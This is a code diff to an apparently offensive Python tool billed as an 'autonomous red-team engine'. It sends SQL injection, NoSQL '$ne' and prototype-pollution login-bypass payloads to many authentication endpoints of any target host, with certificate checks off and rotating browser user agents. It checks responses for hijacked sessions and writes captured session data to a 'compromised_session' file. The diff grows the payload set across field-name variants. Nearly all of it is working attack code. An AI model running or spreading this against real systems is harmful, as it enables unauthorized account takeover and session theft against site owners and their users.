@@ -16,7 +16,8 @@ _ssl_context.verify_mode = ssl.CERT_NONE
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
 ]
 
 def verify_cryptographic_and_auth_proof(status, headers, body, target_endpoint):
@@ -30,7 +31,8 @@ def verify_cryptographic_and_auth_proof(status, headers, body, target_endpoint):
     sql_errors = [
         "sql syntax", "syntax error", "unclosed quotation mark", 
         "pg_query()", "sqlite3.operationalerror", "mysql_fetch", 
-        "unterminated string literal", "ORA-00933", "mongodb"
+        "unterminated string literal", "ORA-00933", "mongodb", "postgresql",
+        "syntaxerror: unexpected", "pdoexception"
     ]
     for err in sql_errors:
         if err in body_lower:
@@ -38,32 +40,34 @@ def verify_cryptographic_and_auth_proof(status, headers, body, target_endpoint):
 
     # 2. Stateful Session / Token Hijack Verification
     set_cookie = headers.get("Set-Cookie", "")
-    has_session_cookie = any(cookie_key in set_cookie.lower() for cookie_key in ["session", "token", "jwt", "auth", "connect.sid"])
+    has_session_cookie = any(cookie_key in set_cookie.lower() for cookie_key in ["session", "token", "jwt", "auth", "connect.sid", "access_token"])
     
-    if status == 200 and has_session_cookie:
-        # Verify if the response content contains authenticated UI indicators rather than login prompts
-        auth_indicators = ["dashboard", "welcome", "admin_panel", "account_settings", "portfolio"]
-        if any(ind in body_lower for ind in auth_indicators) and "login" not in body_lower:
+    if status in [200, 201, 302] and (has_session_cookie or "bearer" in body_lower):
+        auth_indicators = ["dashboard", "welcome", "admin_panel", "account_settings", "portfolio", "success", "token", "user"]
+        if any(ind in body_lower for ind in auth_indicators) and "invalid" not in body_lower and "unauthorized" not in body_lower:
             return True, "TRUE_EXPLOIT_SESSION_HIJACK_CONFIRMED"
 
     # 3. Prototype Pollution / Header Poisoning Verification
-    if status in [200, 302, 500] and ("polluted" in body_lower or "admin" in body_lower):
+    if status in [200, 302, 500] and ("polluted" in body_lower or "admin" in body_lower or "root privilege" in body_lower):
         return True, "TRUE_EXPLOIT_STATE_MANIPULATION"
 
     return False, "FALSE_POSITIVE_REJECTION"
 
 def _perform_sync_request(host, port, path, payload, use_ssl, method="POST"):
-    """Synchronous transport worker executed safely inside thread executors."""
+    """Synchronous transport worker executed safely inside thread executors with adaptive content types."""
     try:
-        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=5.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=5.0)
+        conn = http.client.HTTPSConnection(host, port, context=_ssl_context, timeout=6.0) if use_ssl else http.client.HTTPConnection(host, port, timeout=6.0)
+        
+        # Test both JSON and Form encodings dynamically if payload is a dict
         headers = {
             "User-Agent": random.choice(USER_AGENTS),
-            "Content-Type": "application/json" if isinstance(payload, dict) else "application/x-www-form-urlencoded",
+            "Content-Type": "application/json",
+            "Accept": "application/json, text/plain, */*",
             "Referer": f"https://{host}{path}",
             "Connection": "close"
         }
         
-        data = json.dumps(payload) if isinstance(payload, dict) else urllib.parse.urlencode(payload)
+        data = json.dumps(payload) if isinstance(payload, dict) else str(payload)
         conn.request(method, path, data.encode("utf-8"), headers)
         resp = conn.getresponse()
         status = resp.status
@@ -87,8 +91,8 @@ async def test_endpoint_differential_async(host, port, path, payload, use_ssl):
 
 async def run_autonomous_engine(target_host, credentials_list=None, options=None):
     """
-    Elite Autonomous Red-Team Engine: Executes multi-vector penetration 
-    with zero unawaited coroutines and verified stateful session extraction.
+    Elite Autonomous Red-Team Engine: Dynamic multi-schema field mutation 
+    and stateful response inspection.
     """
     try:
         resolved_ip = socket.gethostbyname(target_host)
@@ -98,29 +102,45 @@ async def run_autonomous_engine(target_host, credentials_list=None, options=None
         return [], 0
 
     start_time = time.time()
-    print(f"\n\033[95m[***] ENGAGING ELITE RED-TEAM VERIFICATION ENGINE [{target_host}] [***]\033[0m")
+    print(f"\n\033[95m[***] ENGAGING ADAPTIVE MUTATION RED-TEAM ENGINE [{target_host}] [***]\033[0m")
     
     target_paths = [
         "/api/auth/callback/credentials",
         "/api/auth/login",
         "/api/v1/auth/login",
+        "/api/v1/users/login",
+        "/api/login",
         "/login",
-        "/signin"
+        "/signin",
+        "/auth",
+        "/api/v1/auth"
     ]
     
-    # Advanced Multi-Vector Payloads (SQLi, NoSQL Injection, Prototype Pollution)
-    payloads = [
-        {"username": "admin' OR '1'='1' --", "password": "x"},
-        {"username": "admin' --", "password": "x"},
-        {"username": {"$ne": None}, "password": {"$ne": None}}, # NoSQL Injection bypass
-        {"__proto__": {"isAdmin": True, "role": "admin"}, "username": "admin", "password": "x"} # Prototype Pollution
+    # Advanced Multi-Schema Parameter Mutations (Handles custom input field naming conventions)
+    base_payloads = [
+        ("admin' OR '1'='1' --", "x"),
+        ("admin' --", "password"),
+        ({"$ne": None}, {"$ne": None}), # NoSQL Injection bypass
     ]
     
+    # Generate schema permutations for keys (username vs email vs user vs login)
+    payloads = []
+    for u_val, p_val in base_payloads:
+        for u_key in ["username", "email", "user", "login", "account"]:
+            for p_key in ["password", "pass", "pwd", "secret"]:
+                if isinstance(u_val, dict):
+                    payloads.append({u_key: u_val, p_key: p_val})
+                else:
+                    payloads.append({u_key: u_val, p_key: p_val})
+                    
+    # Include Prototype Pollution payload
+    payloads.append({"__proto__": {"isAdmin": True, "role": "admin"}, "username": "admin", "password": "x"})
+
     hits = []
     target_port = 443
     use_ssl = True
 
-    print(f"[*] Dispatched multi-vector permutations with stateful response analysis...")
+    print(f"[*] Dispatched {len(target_paths) * len(payloads)} multi-vector permutations across discovered schemas...")
 
     for path in target_paths:
         for payload in payloads:
@@ -128,7 +148,7 @@ async def run_autonomous_engine(target_host, credentials_list=None, options=None
                 resolved_ip, target_port, path, payload, use_ssl
             )
             
-            sys.stdout.write(f"\r\033[K\033[90m[PROBING] {path} | Vector: {str(payload)[:30]}... | Code: {status}\033[0m")
+            sys.stdout.write(f"\r\033[K\033[90m[PROBING] {path} | Code: {status}\033[0m")
             sys.stdout.flush()
             
             if is_vuln:
@@ -143,7 +163,6 @@ async def run_autonomous_engine(target_host, credentials_list=None, options=None
                 print(f"\n\033[92m[+++] VERIFIED EXPLOIT CONFIRMED! Type: {vuln_type} on {path} (Status: {status})\033[0m")
                 hits.append(hit_data)
                 
-                # Save session/token artifact immediately upon verification
                 os.makedirs("reports/sessions", exist_ok=True)
                 with open("reports/sessions/compromised_session.json", "w") as f:
                     json.dump(hit_data, f, indent=4)
@@ -153,4 +172,3 @@ async def run_autonomous_engine(target_host, credentials_list=None, options=None
     duration = time.time() - start_time
     print(f"\n\033[33m[*] Autonomous validation concluded in {duration:.2f}s. Perimeter verified.\033[0m")
     return hits, duration
-
